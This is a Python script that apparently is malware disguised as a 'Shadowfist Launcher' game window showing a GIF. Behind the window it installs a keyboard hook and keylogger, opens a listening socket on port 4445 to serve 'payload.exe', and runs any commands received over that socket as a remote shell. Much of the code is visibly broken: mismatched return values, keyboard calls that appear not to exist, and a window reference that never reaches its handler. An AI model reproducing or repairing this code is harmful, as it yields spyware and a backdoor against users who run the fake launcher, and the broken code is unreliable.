import tkinter as tk
from PIL import Image, ImageTk
import io
import pythoncom
import pyHook
import socket
import subprocess
import os
import time
import pyarmor
import keyboard

def connect():
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', 4445))
    s.listen(1)
    c, addr = s.accept()
    return c

def upload():
    b = open('payload.exe', 'rb').read()
    c, addr = connect()
    c.send(b)
    c.close()

def reverse_shell():
    c, addr = connect()
    while True:
        data = c.recv(1024)
        if data:
            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            stdout, stderr = proc.communicate()
            c.send(stdout)
            c.send(stderr)

def keylogger():
    log = ''
    while True:
        for key in keyboard.get_hotkey_list():
            if isinstance(key, keyboard.HotKey):
                if key.multimedia:
                    log += f'{key.name} - multimedia\n'
                else:
                    log += f'{key.name}\n'
        time.sleep(0.1)

def on_keyboard_event(event):
    if event.Ascii == 13:
        keylogger_window.destroy()

def show_gif(file):
    image = Image.open(file)
    photo = ImageTk.PhotoImage(image)

    window = tk.Toplevel()
    window.attributes('-topmost', 1)
    window.title('Shadowfist Launcher')

    label = tk.Label(window, image=photo)
    label.pack()

    window.geometry('300x300')
    keylogger_window = window

    pythoncom.CoInitialize()
    hm = pyHook.HookManager()
    hm.KeyDown = on_keyboard_event

    hm.HookKeyboard()
    pythoncom.PumpMessages()

if __name__ == '__main__':
    show_gif("start.gif")
    time.sleep(1)
    keylogger()
